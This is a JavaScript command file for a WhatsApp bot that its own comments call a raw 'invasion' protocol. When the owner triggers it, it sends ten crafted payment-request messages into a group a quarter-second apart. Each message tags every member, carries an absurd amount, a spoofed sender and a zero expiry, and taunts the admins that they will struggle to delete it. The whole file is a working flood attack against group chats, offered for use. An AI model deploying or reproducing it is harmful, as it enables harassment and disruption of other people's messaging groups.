/**
 * 🚀 COMANDO OZXX REAL - PROTOCOLO BRUTO (INVASÃO)
 * @author Leandro Rocha
 * @project CYBERSOBERANO 💋⭐✨💫🌙🖤
 */

const handler = async (m, { conn, participants, isSoberano }) => {
    if (!isSoberano) return

    await m.reply('🚀 *INICIANDO PROTOCOLO BRUTO OZXX...*')

    const members = participants.map(u => u.id)
    const corpoTexto = `⚔️𝐋 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘🏴 ⚔️\n\n⚠️ *Boa sorte pra apagar ai adm* 😜\n\n⚔️𝐋 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘🏴 𝐃𝐎𝐌𝐈𝐍𝐀`.trim()

    for (let i = 0; i < 10; i++) {
        try {
            // Gerando a mensagem no formato bruto (Binary Nodes)
            let msg = {
                requestPaymentMessage: {
                    currencyCodeIso4217: 'BRL',
                    amount1000: 100000000000,
                    requestFrom: '0@s.whatsapp.net',
                    noteMessage: {
                        extendedTextMessage: {
                            text: corpoTexto + (i > 0 ? `\n_Rajada [${i+1}]_` : ''),
                            mentions: members
                        }
                    },
                    expiryTimestamp: 0,
                    amount: {
                        value: 100000000000,
                        offset: 1000,
                        currencyCode: 'BRL'
                    }
                }
            }

            // Enviando via relayMessage (mais potente que sendMessage)
            await conn.relayMessage(m.chat, msg, { messageId: conn.generateMessageTag() })
            
            // Delay curtíssimo para efeito de flood
            await new Promise(resolve => setTimeout(resolve, 250))
        } catch (err) {
            console.error('FALHA NO PROTOCOLO:', err)
        }
    }
}

handler.help = ['ozxx']
handler.tags = ['owner']
handler.command = ['ozxx', 'disparar',"raja"]
handler.group = true 
handler.owner = true 

export default handler